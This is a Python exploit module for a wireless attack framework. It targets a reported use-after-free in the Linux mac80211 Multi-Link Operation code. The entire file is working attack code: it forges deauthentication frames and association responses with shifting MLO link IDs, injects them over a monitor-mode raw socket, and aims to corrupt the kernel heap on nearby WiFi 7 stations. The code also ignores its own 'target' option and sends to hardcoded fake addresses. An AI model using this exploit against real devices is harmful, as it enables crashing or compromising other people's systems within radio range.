# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux mac80211 Multi-Link Operation Use-After-Free (CVE-2026-64574).

    The mac80211 subsystem in the Linux kernel contains a use-after-free
    vulnerability in the Multi-Link Operation (MLO) teardown path.  When
    a station disconnects from an MLO-capable AP, the driver frees the
    per-link data structures but fails to clear all references in the
    aggregation state.  A reconnection attempt that triggers link
    reconfiguration dereferences the freed per-link struct, corrupting
    kernel heap memory.

    An attacker within WiFi range can trigger this by forcing
    disconnection (deauth) followed by rapid reconnection with a
    different link configuration.

    CVSS v3.1: ~7.8 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux mac80211 MLO Use-After-Free (CVE-2026-64574)",
        "description": (
            "Exploits CVE-2026-64574, a use-after-free in the mac80211 "
            "MLO teardown path.  Disconnection frees per-link structs "
            "but leaves stale references in the aggregation state.  "
            "Rapid reconnection with changed link config dereferences "
            "freed memory, enabling kernel heap corruption."
        ),
        "authors": (
            "Linux kernel wireless team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-64574",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-06-10",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with mac80211 MLO support (6.5+)",
            "WiFi 7 / 802.11be capable stations",
            "Ubuntu 24.04+, Fedora 40+ (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    deauth_rounds = OptInteger(8, "Number of deauth/reconnect cycles")
    burst_delay = OptFloat(0.01, "Delay between deauth and reconnect frames")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_DEAUTH = 0x0C
    _SUBTYPE_ASSOC_RESP = 0x01
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_EXTENSION = 255
    _EXT_MULTI_LINK = 107

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"
    _FAKE_DST = b"\x02\x00\x00\x00\x00\x03"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_deauth_frame(self, src: bytes, dst: bytes, seq: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_DEAUTH)
        duration = struct.pack("<H", 0)
        bssid = src
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + bssid + seq_ctrl
        reason = struct.pack("<H", 7)
        radiotap = self._build_radiotap_header()
        return radiotap + header + reason

    def _build_mlo_assoc_response(self, seq: int, link_id: int) -> bytes:
        """Build an association response with MLO element.

        Varying the link_id across reconnection attempts triggers the
        UAF by accessing the stale per-link struct from the old config.
        """
        fc = self._build_frame_control(self._SUBTYPE_ASSOC_RESP)
        duration = struct.pack("<H", 0)
        dst = self._FAKE_DST
        src = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + src + seq_ctrl

        capability = struct.pack("<H", 0x0431)
        status_code = struct.pack("<H", 0)
        aid = struct.pack("<H", 1)
        fixed = capability + status_code + aid

        rates_ie = struct.pack("BB", 1, 4) + bytes([0x82, 0x84, 0x8B, 0x96])

        ext_id = struct.pack("B", self._EXT_MULTI_LINK)
        ml_control = struct.pack("<H", 0x0001)
        common_info_len = struct.pack("B", 13)
        mld_addr = self._FAKE_BSSID
        link_id_info = struct.pack("B", link_id & 0xFF)
        bss_change_count = struct.pack("B", seq & 0xFF)
        eml_cap = struct.pack("<H", 0x0000)
        mld_cap = struct.pack("<H", 0x0000)
        common_info = common_info_len + mld_addr + link_id_info + bss_change_count + eml_cap + mld_cap
        ml_data = ext_id + ml_control + common_info
        ml_ie = struct.pack("BB", self._IE_EXTENSION, len(ml_data)) + ml_data

        body = fixed + rates_ie + ml_ie
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        header = fc + duration + self._BROADCAST + self._FAKE_BSSID + self._BROADCAST + struct.pack("<H", 0)
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; triggering MLO UAF cycle")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        src = self._FAKE_BSSID
        dst = self._FAKE_DST

        print_status(
            f"Running {self.deauth_rounds} deauth/reconnect cycles "
            f"with varying MLO link IDs"
        )

        success = 0
        for rnd in range(self.deauth_rounds):
            deauth = self._build_deauth_frame(src, dst, rnd * 2)
            if self._inject_frame(raw, deauth):
                success += 1

            time.sleep(self.burst_delay)

            link_id = (rnd % 3) + 1
            assoc = self._build_mlo_assoc_response(rnd * 2 + 1, link_id)
            if self._inject_frame(raw, assoc):
                success += 1

            time.sleep(self.burst_delay)

        raw.close()

        print_status(f"Injected {success} frames across {self.deauth_rounds} cycles")
        print_info(
            "Each cycle sends a deauth followed by an association "
            "response with a different MLO link ID.  The mac80211 "
            "teardown path frees per-link structs but the aggregation "
            "state retains stale pointers.  Monitor for kernel oops."
        )
